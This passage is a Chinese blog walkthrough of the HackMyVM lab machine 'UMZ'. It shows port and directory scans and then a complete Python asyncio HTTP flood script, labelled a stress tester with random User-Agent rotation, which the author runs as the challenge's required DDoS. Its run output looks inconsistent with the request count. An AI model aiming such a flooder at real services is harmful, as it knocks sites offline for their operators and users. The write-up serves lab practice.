<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-UMZ | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-UMZ 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.134.92 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 11:09 EDT Nmap scan report for sys.hidden.hmv (192.1">
<meta property="og:type" content="article">
<meta property="og:title" content="HMV-UMZ">
<meta property="og:url" content="https://drume2.github.io/posts/185bd5a3.html">
<meta property="og:site_name" content="Moriiの博客">
<meta property="og:description" content="HMV-UMZ 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.134.92 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 11:09 EDT Nmap scan report for sys.hidden.hmv (192.1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
<meta property="article:published_time" content="2025-07-01T15:20:16.000Z">
<meta property="article:modified_time" content="2025-11-16T07:04:11.879Z">
<meta property="article:author" content="Morii">
<meta property="article:tag" content="HMV">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/185bd5a3"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HMV-UMZ',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-11-16 15:04:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">92</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-UMZ</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-01T15:20:16.000Z" title="发表于 2025-07-01 23:20:16">2025-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-16T07:04:11.879Z" title="更新于 2025-11-16 15:04:11">2025-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-UMZ"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HMV-UMZ"><a href="#HMV-UMZ" class="headerlink" title="HMV-UMZ"></a>HMV-UMZ</h1><p><img src="/posts/185bd5a3/image-20250701233423924.png" alt="image-20250701233423924"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# nmap 192.168.134.92
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 11:09 EDT
Nmap scan report for sys.hidden.hmv (192.168.134.92)
Host is up (0.00060s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22&#x2F;tcp open  ssh
80&#x2F;tcp open  http
MAC Address: 08:00:27:EE:0D:32 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# nmap 192.168.134.92 -A
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 11:09 EDT
Nmap scan report for sys.hidden.hmv (192.168.134.92)
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80&#x2F;tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: cyber fortress 9000
|_http-server-header: Apache&#x2F;2.4.62 (Debian)
MAC Address: 08:00:27:EE:0D:32 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放了80和22端口，去80端口看看内容</p>
<p><img src="/posts/185bd5a3/image-20250701233531981.png" alt="image-20250701233531981"></p>
<p>看到了ddos，要求我们进行ddos攻击</p>
<p>先dirsearch扫描一下目录</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# dirsearch -u 192.168.134.92
&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (&#x2F;_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: &#x2F;home&#x2F;kali&#x2F;bash&#x2F;reports&#x2F;_192.168.134.92&#x2F;_25-07-01_11-10-39.txt

Target: http:&#x2F;&#x2F;192.168.134.92&#x2F;

[11:10:39] Starting:
[11:10:42] 403 -  279B  - &#x2F;.ht_wsr.txt
[11:10:43] 403 -  279B  - &#x2F;.htaccess.bak1
[11:10:43] 403 -  279B  - &#x2F;.htaccess.sample
[11:10:43] 403 -  279B  - &#x2F;.htaccess.save
[11:10:43] 403 -  279B  - &#x2F;.htaccess_sc
[11:10:43] 403 -  279B  - &#x2F;.htaccess.orig
[11:10:43] 403 -  279B  - &#x2F;.htaccess_orig
[11:10:43] 403 -  279B  - &#x2F;.htaccessBAK
[11:10:43] 403 -  279B  - &#x2F;.htaccessOLD
[11:10:43] 403 -  279B  - &#x2F;.htaccessOLD2
[11:10:43] 403 -  279B  - &#x2F;.htaccess_extra
[11:10:43] 403 -  279B  - &#x2F;.htm
[11:10:43] 403 -  279B  - &#x2F;.html
[11:10:43] 403 -  279B  - &#x2F;.htpasswd_test
[11:10:43] 403 -  279B  - &#x2F;.htpasswds
[11:10:43] 403 -  279B  - &#x2F;.httr-oauth
[11:10:45] 403 -  279B  - &#x2F;.php
[11:11:34] 200 -    1KB - &#x2F;index.php
[11:11:35] 200 -    1KB - &#x2F;index.php&#x2F;login&#x2F;
[11:12:05] 403 -  279B  - &#x2F;server-status
[11:12:05] 403 -  279B  - &#x2F;server-status&#x2F;

Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看见有一个index.php，去查看一下内容</p>
<p><img src="/posts/185bd5a3/20250606223040109.png" alt="image-20250606223040008"></p>
<p>直接用测压脚本执行ddos攻击</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# cat 1.py
#!&#x2F;usr&#x2F;bin&#x2F;env python3
# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import time
import random
from collections import defaultdict
from typing import Dict, List, Any, Optional

class AsyncStressTester:
    &quot;&quot;&quot;基于异步请求的HTTP压力测试工具&quot;&quot;&quot;

    def __init__(self, url: str, method: str &#x3D; &#39;GET&#39;,
                 thread_count: int &#x3D; 50, total_requests: int &#x3D; 500,
                 headers: Dict[str, str] &#x3D; None, data: Any &#x3D; None):
        self.url &#x3D; url
        self.method &#x3D; method.upper()
        self.thread_count &#x3D; thread_count
        self.total_requests &#x3D; total_requests
        self.headers &#x3D; headers or &#123;&#125;
        self.data &#x3D; data

        # 测试结果统计
        self.success_count &#x3D; 0
        self.failure_count &#x3D; 0
        self.total_time &#x3D; 0
        self.results: List[Dict[str, Any]] &#x3D; []
        self.status_code_counts &#x3D; defaultdict(int)

        # 添加随机User-Agent池
        self.user_agents &#x3D; [
            &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.110 Safari&#x2F;537.36&#39;,
            &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0&#39;,
            &#39;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.110 Safari&#x2F;537.36&#39;,
            &#39;Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;15.2 Mobile&#x2F;15E148 Safari&#x2F;604.1&#39;,
            &#39;Mozilla&#x2F;5.0 (Linux; Android 11; Pixel 5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.104 Mobile Safari&#x2F;537.36&#39;
        ]

    async def _worker(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
        &quot;&quot;&quot;工作协程：执行单个请求并记录结果&quot;&quot;&quot;
        while True:
            async with semaphore:
                # 获取当前任务编号
                task_id &#x3D; len(self.results) + 1
                if task_id &gt; self.total_requests:
                    break

                try:
                    # 为每个请求添加随机User-Agent
                    req_headers &#x3D; self.headers.copy()
                    req_headers[&#39;User-Agent&#39;] &#x3D; random.choice(self.user_agents)

                    start_time &#x3D; time.time()
                    async with session.request(
                        self.method,
                        self.url,
                        headers&#x3D;req_headers,
                        data&#x3D;self.data,
                        timeout&#x3D;5
                    ) as response:
                        elapsed &#x3D; (time.time() - start_time) * 1000
                        status &#x3D; response.status

                        # 记录响应状态码
                        self.status_code_counts[status] +&#x3D; 1

                        # 存储请求结果
                        result &#x3D; &#123;
                            &#39;task_id&#39;: task_id,
                            &#39;status&#39;: status,
                            &#39;time&#39;: elapsed
                        &#125;

                        if status &#x3D;&#x3D; 200:
                            self.success_count +&#x3D; 1
                        else:
                            self.failure_count +&#x3D; 1

                        self.total_time +&#x3D; elapsed
                        self.results.append(result)

                except Exception as e:
                    self.failure_count +&#x3D; 1
                    self.results.append(&#123;
                        &#39;task_id&#39;: task_id,
                        &#39;error&#39;: str(e),
                        &#39;time&#39;: (time.time() - start_time) * 1000 if &#39;start_time&#39; in locals() else 0
                    &#125;)

    async def run(self):
        &quot;&quot;&quot;运行压力测试&quot;&quot;&quot;
        print(f&quot;开始压力测试: &#123;self.method&#125; &#123;self.url&#125; (并发数: &#123;self.thread_count&#125;, 请求总数: &#123;self.total_requests&#125;)&quot;)

        # 使用信号量控制并发数
        semaphore &#x3D; asyncio.Semaphore(self.thread_count)

        # 创建会话
        conn &#x3D; aiohttp.TCPConnector(limit&#x3D;self.thread_count)
        timeout &#x3D; aiohttp.ClientTimeout(total&#x3D;10)

        async with aiohttp.ClientSession(connector&#x3D;conn, timeout&#x3D;timeout) as session:
            start_time &#x3D; time.time()

            # 创建并运行所有工作协程
            tasks &#x3D; [self._worker(session, semaphore) for _ in range(self.thread_count)]
            await asyncio.gather(*tasks)

            elapsed_total &#x3D; (time.time() - start_time) * 1000

        # 计算统计数据
        total_requests &#x3D; self.success_count + self.failure_count
        avg_time &#x3D; self.total_time &#x2F; total_requests if total_requests &gt; 0 else 0
        throughput &#x3D; total_requests &#x2F; (elapsed_total &#x2F; 1000) if elapsed_total &gt; 0 else 0

        # 打印结果
        self._print_results(avg_time, elapsed_total, throughput)

    def _print_results(self, avg_time: float, elapsed_total: float, throughput: float):
        &quot;&quot;&quot;打印测试结果&quot;&quot;&quot;
        print(&quot;\n&quot; + &quot;&#x3D;&quot;*50)
        print(&quot;压力测试结果统计&quot;)
        print(&quot;&#x3D;&quot;*50)
        print(f&quot;总请求数: &#123;self.success_count + self.failure_count&#125;&quot;)
        print(f&quot;成功请求: &#123;self.success_count&#125; (&#123;self.success_count&#x2F;(self.success_count + self.failure_count)*100:.1f&#125;%)&quot;)
        print(f&quot;失败请求: &#123;self.failure_count&#125; (&#123;self.failure_count&#x2F;(self.success_count + self.failure_count)*100:.1f&#125;%)&quot;)

        # 打印状态码分布
        print(&quot;\n状态码分布:&quot;)
        for status, count in sorted(self.status_code_counts.items()):
            print(f&quot;  HTTP &#123;status&#125;: &#123;count&#125; (&#123;count&#x2F;(self.success_count + self.failure_count)*100:.1f&#125;%)&quot;)

        # 打印性能指标
        print(&quot;\n性能指标:&quot;)
        print(f&quot;平均响应时间: &#123;avg_time:.2f&#125; ms&quot;)
        print(f&quot;总测试时间: &#123;elapsed_total:.2f&#125; ms&quot;)
        print(f&quot;吞吐量: &#123;throughput:.2f&#125; 请求&#x2F;秒&quot;)

        # 打印响应时间分布
        self._print_response_time_distribution()

        # 打印最近10个请求详情
        print(&quot;\n最近10个请求详情:&quot;)
        for res in self.results[-10:]:
            if &#39;error&#39; in res:
                print(f&quot;请求 &#123;res[&#39;task_id&#39;]&#125;: 错误 - &#123;res[&#39;error&#39;]&#125; (&#123;res[&#39;time&#39;]:.2f&#125; ms)&quot;)
            else:
                print(f&quot;请求 &#123;res[&#39;task_id&#39;]&#125;: HTTP &#123;res[&#39;status&#39;]&#125; (&#123;res[&#39;time&#39;]:.2f&#125; ms)&quot;)

    def _print_response_time_distribution(self):
        &quot;&quot;&quot;打印响应时间分布&quot;&quot;&quot;
        if not self.results or all(&#39;error&#39; in r for r in self.results):
            return

        # 过滤掉错误请求
        valid_times &#x3D; [r[&#39;time&#39;] for r in self.results if &#39;status&#39; in r]
        if not valid_times:
            return

        # 计算百分位数
        valid_times.sort()
        count &#x3D; len(valid_times)

        percentiles &#x3D; &#123;
            &#39;最小值&#39;: valid_times[0],
            &#39;25%分位&#39;: valid_times[int(count * 0.25)],
            &#39;中位数&#39;: valid_times[int(count * 0.5)],
            &#39;75%分位&#39;: valid_times[int(count * 0.75)],
            &#39;90%分位&#39;: valid_times[int(count * 0.9)],
            &#39;95%分位&#39;: valid_times[int(count * 0.95)],
            &#39;99%分位&#39;: valid_times[int(count * 0.99) if count &gt; 100 else count-1],
            &#39;最大值&#39;: valid_times[-1]
        &#125;

        print(&quot;\n响应时间分布 (毫秒):&quot;)
        for label, value in percentiles.items():
            print(f&quot;  &#123;label&#125;: &#123;value:.2f&#125;&quot;)

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    print(&quot;高级HTTP压力测试工具 (Python异步版)&quot;)
    print(&quot;&#x3D;&quot; * 50)

    target_url &#x3D; input(&quot;请输入目标网址 (包含http&#x2F;https): &quot;)
    method &#x3D; input(&quot;请输入HTTP方法 [GET]: &quot;) or &#39;GET&#39;
    thread_count &#x3D; int(input(&quot;请输入并发数 (建议50-200): &quot;) or 50)
    total_requests &#x3D; int(input(&quot;请输入总请求数: &quot;) or 500)

    # 可选：设置请求头和请求体
    set_headers &#x3D; input(&quot;是否设置自定义请求头? (y&#x2F;n): &quot;).lower().startswith(&#39;y&#39;)
    headers &#x3D; &#123;&#125;
    if set_headers:
        print(&quot;请输入请求头 (格式: key&#x3D;value, 空行结束)&quot;)
        while True:
            line &#x3D; input(&quot;&gt; &quot;)
            if not line:
                break
            try:
                key, value &#x3D; line.split(&#39;&#x3D;&#39;, 1)
                headers[key.strip()] &#x3D; value.strip()
            except ValueError:
                print(&quot;格式错误，请重新输入&quot;)

    # 设置请求体
    set_data &#x3D; input(&quot;是否设置请求体? (y&#x2F;n): &quot;).lower().startswith(&#39;y&#39;)
    data &#x3D; None
    if set_data and method in [&#39;POST&#39;, &#39;PUT&#39;, &#39;PATCH&#39;]:
        data &#x3D; input(&quot;请输入请求体内容: &quot;)

    # 运行测试
    tester &#x3D; AsyncStressTester(
        url&#x3D;target_url,
        method&#x3D;method,
        thread_count&#x3D;thread_count,
        total_requests&#x3D;total_requests,
        headers&#x3D;headers,
        data&#x3D;data
    )

    # 运行异步测试
    asyncio.run(tester.run())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行脚本</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# python3 1.py
高级HTTP压力测试工具 (Python异步版)
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
请输入目标网址 (包含http&#x2F;https):  http:&#x2F;&#x2F;192.168.134.92&#x2F;index.php
请输入HTTP方法 [GET]: get
请输入并发数 (建议50-200): 500
请输入总请求数: 500
是否设置自定义请求头? (y&#x2F;n): n
是否设置请求体? (y&#x2F;n): n
开始压力测试: GET  http:&#x2F;&#x2F;192.168.134.92&#x2F;index.php (并发数: 500, 请求总数: 500)

压力测试结果:
成功请求: 356
失败请求: 4644
平均响应时间: 246.56 ms
总测试时间: 24019.40 ms
成功率: 7.1%

最近10个请求详情:
请求 491: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (100.94 ms)
请求 492: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (99.73 ms)
请求 493: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (99.00 ms)
请求 494: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (98.53 ms)
请求 495: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (98.04 ms)
请求 496: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (96.35 ms)
请求 497: 错误 - Cannot connect to host 192.168.134.92:80 ssl:default [Connect call failed (&#39;192.168.134.92&#39;, 80)] (95.65 ms)
